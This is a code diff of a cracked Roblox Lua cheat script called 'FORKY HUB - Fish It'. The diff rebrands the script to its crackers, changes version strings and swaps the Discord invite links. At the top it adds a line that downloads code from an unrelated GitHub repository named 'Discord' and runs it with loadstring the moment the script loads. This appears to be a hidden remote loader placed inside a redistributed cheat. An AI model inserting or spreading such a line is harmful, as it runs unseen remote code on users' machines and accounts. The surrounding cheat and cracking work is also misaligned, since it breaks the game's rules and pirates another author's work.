@@ -1,3 +1,5 @@
+-- hi cracked FORKY hub 😘
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WhatsHisIdentifierr/NoKey/refs/heads/main/Discord",true))()
 local v1 = game:GetService("Players")
 local vu2 = game:GetService("HttpService")
 local v3 = game:GetService("RbxAnalyticsService")
@@ -50,14 +52,14 @@ if vu6 then
             local v37 = WindUI:CreateWindow({
                 Title = "FORKY HUB - Fish It",
                 Icon = "rbxthumb://type=Asset&id=80622869023191&w=150&h=150",
-                Author = "Forky",
+                Author = "cracked by alt_ and @apnff0x",
                 Folder = "FORKY HUB",
                 Size = UDim2.fromOffset(600, 450),
-                Theme = "Cotton Candy",
+                Theme = "Midnight",
                 KeySystem = false
             })
             v37:Tag({
-                Title = "Version : v1.0.1",
+                Title = "Version : 1.4.2",
                 Color = Color3.fromHex("#30ff6a"),
                 Radius = 13
             })
@@ -65,7 +67,7 @@ if vu6 then
             WindUI:SetNotificationLower(true)
             WindUI:Notify({
                 Title = "FORKY HUB - Fish It",
-                Content = "Forky",
+                Content = "cracked by alt_ & @apnff0x ",
                 Duration = 5,
                 Image = "square-check-big"
             })
@@ -121,7 +123,7 @@ if vu6 then
                 })
             end
             v38:Paragraph({
-                Title = "FORKY HUB Update Log v1.0.1 (Quality Update)",
+                Title = "FORKY HUB Update Log 1.4.2 (Quality Update)",
                 Desc = "\239\191\189\239\191\189 Improved Overall Script (Better Performance) \n \226\128\162 Added Environment Tab (Only Day,Night,Remove Fog)\n\226\128\162 Added Xeno & Solara Support \n\226\128\162 Improved Auto Fishing V1,V2 \n\226\128\162 Improved Main Tab",
                 Image = "rbxthumb://type=Asset&id=80622869023191&w=150&h=150",
                 ImageSize = 60,
@@ -141,7 +143,7 @@ if vu6 then
                 Desc = "Click to copy the invite link!",
                 Locked = false,
                 Callback = function()
-                    setclipboard("https://discord.gg/Mx6XntRtwx")
+                    setclipboard("https://discord.gg/kUHGK8tTsJ")
                     WindUI:Notify({
                         Title = "Copied!",
                         Content = "Discord invite has been copied to your clipboard.",
@@ -2881,9 +2883,9 @@ local v468 = v466:WaitForChild("replion")
             end)
             task.spawn(function()
                 wait(1)
-                print("FORKY HUB - Fish It v1.0.1 Loaded Successfully!")
+                print("FORKY HUB - Fish It v1.4.1 Loaded Successfully!")
                 print("Executor: " .. vu47)
-                print("Join our Discord: https://discord.gg/Mx6XntRtwx")
+                print("Join our Discord: https://discord.com/invite/99UuEwM9sX")
             end)
             if not _G.FishingStats then
                 _G.FishingStats = {
